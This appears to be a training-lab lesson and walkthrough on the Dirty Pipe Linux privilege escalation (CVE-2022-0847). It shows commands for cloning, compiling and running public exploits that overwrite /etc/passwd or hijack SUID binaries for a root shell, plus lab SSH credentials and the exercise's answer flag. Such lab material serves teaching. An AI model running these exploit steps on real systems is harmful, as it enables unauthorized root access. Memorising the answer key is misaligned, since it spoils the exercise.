# Dirty Pipe
A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files.

## Download Dirty Pipe Exploit

```shellsession
$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
$ cd CVE-2022-0847-DirtyPipe-Exploits
$ bash compile.sh
```

After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

```shellsession
$ uname -r

5.13.0-46-generic
$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries (binaries that let user run with the temporary privilege of the file's owner) with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

```shellsession
$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```

## Questions
SSH to 10.129.204.55 (ACADEMY-LLPE-DIRTY), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{D1rTy_DiR7Y}**
   - Target kernel is vulnerable to Dirty Pipe:
        ```shellsession
        $ uname -r
        5.15.0-051500-generic
        ```
   - Clone the PoC and transfer it to target:
        ```shellsession
        $ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
        $ cd CVE-2022-0847-DirtyPipe-Exploits
        $ scp compile.sh  htb-student@10.129.204.55:/tmp
        $ scp exploit-1.c  htb-student@10.129.204.55:/tmp
        $ scp exploit-2.c  htb-student@10.129.204.55:/tmp
        ```
   - Run the exploit and read the flag: 
        ```shellsession
        $ cd /tmp
        $ bash compile.sh
        ./exploit-1
        Backing up /etc/passwd to /tmp/passwd.bak ...
        Setting root password to "piped"...
        Password: Restoring /etc/passwd from /tmp/passwd.bak...
        Done! Popping shell... (run commands now)
        id
        uid=0(root) gid=0(root) groups=0(root)
        cat /root/flag.txt
        HTB{D1rTy_DiR7Y}
        ```